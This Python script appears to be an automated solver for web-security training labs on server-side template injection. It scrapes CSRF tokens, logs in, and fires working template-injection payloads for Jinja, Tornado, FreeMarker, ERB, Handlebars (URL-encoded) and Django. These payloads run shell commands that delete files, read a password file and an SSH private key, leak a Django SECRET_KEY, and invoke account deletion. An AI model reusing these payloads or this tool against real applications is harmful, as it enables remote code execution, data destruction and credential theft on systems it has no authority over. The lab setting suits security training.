import argparse
from bs4 import BeautifulSoup
import requests
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Fetching CSRF token for login
def get_csrf_token(login_url, s):
    r = s.get(login_url, verify=False)
    soup = BeautifulSoup(r.content, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


#  Logging with credentials
def login_with_creds(url, username, password, s):
    login_url = f"{url}/login"
    csrf_token = get_csrf_token(login_url, s)
    data = {'csrf': csrf_token,
        'username': username,
        'password': password,
    }
    response = s.post(login_url, data=data)

    # Fetching new generated CSRF token
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_after_login = soup.find("input", {'name': 'csrf'})['value']

    # Checking logged in or not 
    if "Log out" in response.text:
        print(f"{Fore.LIGHTGREEN_EX}[+]  Successfully logged in as {Fore.LIGHTGREEN_EX}{username}:{password}{Style.RESET_ALL}.")
        print(f'{Fore.LIGHTGREEN_EX}[+]  Sending paylaod...{Style.RESET_ALL}')
        comment_path = f'{url}/post/comment'
        dataa = {'csrf':csrf_after_login, 'postId':'8','comment':'hello'}
        sending_req_for_post_comment = s.post(comment_path,data=dataa)
        send_payload(url, csrf_after_login, s)
    else:
        print(f"{Fore.RED}[-]  Failed to login as {Fore.YELLOW}{username}:{password}{Style.RESET_ALL}.")
    return csrf_after_login


# Sending payload to delete file
def send_payload(url, csrf_after_login, s):
    urls = [
            f"{url}/my-account/change-blog-post-author-display", 
            url+'/product/template?productId=1'
           ]
    datas = [
        {"csrf":csrf_after_login,"blog-post-author-display":"user.name}}{% import os %}{{os.system('rm morale.txt')"}, {'csrf':csrf_after_login, 'template':'<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }','template-action':'preview'}, 
        {'blog-post-author-display':'user.name}}{%25+import+os+%25}{{os.system("rm /home/carlos/morale.txt")','csrf':csrf_after_login},
        {'csrf':csrf_after_login, 'template':'{{settings.SECRET_KEY}}','template-action':'preview'},
        {'csrf':csrf_after_login, 'template':'${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ")}', 'template-action':'preview'},
        {'blog-post-author-display':'user.setAvatar("/home/carlos/.ssh/id_rsa","image/jpg")', 'csrf':csrf_after_login},
        {'blog-post-author-display':'user.gdprDelete()', 'csrf':csrf_after_login},
        ]
    
    for i in urls:
        for j in datas:
            if j == {'blog-post-author-display': 'user.gdprDelete()', 'csrf': csrf_after_login} or j == {'blog-post-author-display':'user.name}}{%25+import+os+%25}{{os.system("rm /home/carlos/morale.txt")','csrf':csrf_after_login}:
                    r = s.get(url+'/post?postId=8')
            rp = s.post(url=i, data=j)
            if rp.status_code == 302 or rp.status_code == 200:
                check_solved_orNot(rp, rp)

            


def check_solved_orNot(rp, response):
    html = rp.text

    if 'is-solved' in rp.text or 'is-solved' in response.text:
        print(f'{Fore.LIGHTGREEN_EX}[+]  Lab is Solved!{Style.RESET_ALL}')
    elif '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/home/carlos/my_password.txt").toURL().openStream().readAllBytes()?join(" ")}' in rp.text or '{{settings.SECRET_KEY}}' in html:
        soup = BeautifulSoup(html, 'html.parser')
        div_element = soup.find('div', {'id':'preview-result'})
        value = div_element.get_text(strip=True)
        print(f"[+] {Fore.LIGHTCYAN_EX} SECRET_KEY:{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX} {value}{Style.RESET_ALL}")
    else:
        print(f'{Fore.RED}[-]  Failed try again or Refresh Page.{Style.RESET_ALL}')
        return False

    return True




# this func is called when not need authenticate
def send_paylaod_nocreds(url): 
    endpoints = ['?message=<%25+system("rm+/home/carlos/morale.txt")+%25>)', '?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d']
    
    solution_found = False

    with ThreadPoolExecutor(max_workers=1) as executor:
        futures = {executor.submit(send_request, url, endpoint): endpoint for endpoint in endpoints}

        for future in concurrent.futures.as_completed(futures):
            if solution_found:
                break

            endpoint = futures[future]
            try:
                response = future.result()
                rd = response.text
                if response.status_code == 200:
                    check_solved_orNot(response, response)
                    return
                
            except Exception as e:
                print(f"{Fore.RED}[+]  Error sending request : {e}{Style.RESET_ALL}")


def send_request(url, endpoint, data=None, method='GET'):
    full_url = f"{url}/{endpoint}"
    if method == 'GET':
        response = requests.get(full_url)
    elif method == 'POST':
        response = requests.post(full_url, data=data)
    return response


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        usage=" %(prog)s -h or --help",
        epilog='Additional information that will be displayed at the end of the help message.'
    )
    parser.add_argument('-U','--url', required=True, help='URL (required)')
    parser.add_argument('-u', '--username', required=False, help='Username if required')
    parser.add_argument('-p', '--password', required=False, help='Password if required')
    args = parser.parse_args()
    url = args.url
    username = args.username
    password = args.password
    if requests.get(url).status_code != 200: 
        print(f'{Fore.RED}[-]  Invalid link or Gateway time Error.{Style.RESET_ALL}')
    else:
        if args.username is None and args.password is None:
            send_paylaod_nocreds(url)
        else:
            s = requests.session()
            login_with_creds(url, username, password, s)


if __name__ == "__main__":
    main()

